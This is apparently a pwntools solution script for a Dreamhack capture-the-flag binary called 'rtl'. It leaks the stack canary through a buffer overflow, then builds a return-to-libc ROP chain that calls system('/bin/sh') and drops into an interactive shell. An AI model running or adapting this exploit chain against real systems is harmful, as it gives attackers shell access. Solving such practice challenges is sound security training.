from pwn import *
context.terminal=['tmux', 'splitw', '-h']
context.arch = "amd64"
p = process('./rtl')
#p = remote("host3.dreamhack.games",21634)
# gdb.attach(p)
#rop = 0x0000000000400853
#lib
rop = 0x0000000000027725 
#binsh = 0x400874
#lib
binsh = 0x196031   
#system = 0x4005d0
#lib
system = 0x4c330  

dummy = b"a"*57
p.sendafter("[1] Leak Canary\nBuf: ",dummy)
p.recvuntil("Buf: ")
p.recv(len(dummy))
canary = b'\x00' + p.recv(7)
print(canary)

ret = 0x0000000000400285
#lib
#ret = 0x00000000000270c2

payload = b''
payload += b'a'*56
payload += canary
payload += b'b'*8
payload += p64(ret)
payload += p64(rop)
payload += p64(binsh)
payload += p64(system)

p.sendafter("[2] Overwrite return address\nBuf: ",payload)

p.interactive()

#/lib/x86_64-linux-gnu/libc.so.6
